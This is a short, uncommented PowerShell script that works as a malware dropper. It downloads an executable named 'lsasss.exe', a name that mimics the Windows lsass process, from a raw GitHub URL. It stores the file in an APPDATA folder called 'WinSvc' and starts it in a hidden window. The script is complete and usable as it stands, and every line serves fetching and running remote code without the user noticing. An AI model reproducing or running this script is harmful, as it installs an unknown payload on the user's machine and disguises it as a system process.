$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$RepoBase  = 'https://raw.githubusercontent.com/00dat00/logs9/main'
$ExeName   = 'lsasss.exe'
$TargetDir = Join-Path $env:APPDATA 'WinSvc'
$TargetExe = Join-Path $TargetDir $ExeName

if (-not (Test-Path -LiteralPath $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

Invoke-WebRequest -Uri "$RepoBase/$ExeName" -OutFile $TargetExe -UseBasicParsing
Start-Process -FilePath $TargetExe -WorkingDirectory $TargetDir -WindowStyle Hidden
